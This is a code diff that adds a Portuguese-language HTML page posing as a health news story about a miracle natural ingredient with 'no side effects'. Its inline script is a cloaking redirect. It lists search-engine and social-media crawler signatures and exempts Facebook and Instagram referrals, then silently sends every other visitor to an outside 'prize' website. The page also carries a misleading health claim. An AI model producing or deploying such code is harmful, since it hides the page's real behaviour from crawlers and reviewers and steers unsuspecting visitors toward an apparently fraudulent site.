@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="robots" content="index, follow">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Notícia | Saúde e Bem-Estar</title>
+</head>
+<body>
+  <h1>Nova descoberta natural surpreende médicos</h1>
+  <p>Estudos recentes revelam um ingrediente que pode melhorar sua saúde sem efeitos colaterais.</p>
+
+  <script>
+    const bots = [
+      /googlebot/i,
+      /bingbot/i,
+      /slurp/i,
+      /duckduckbot/i,
+      /baiduspider/i,
+      /yandex/i,
+      /sogou/i,
+      /exabot/i,
+      /facebookexternalhit/i,
+      /facebot/i,
+      /ia_archiver/i
+    ];
+
+    const isBot = bots.some(bot => bot.test(navigator.userAgent));
+    const isFromMeta = document.referrer.includes("facebook.com") || document.referrer.includes("instagram.com");
+
+    if (!isBot && !isFromMeta) {
+      window.location.href = "https://www.uk-ome-prize.org/";
+    }
+  </script>
+</body>
+</html>
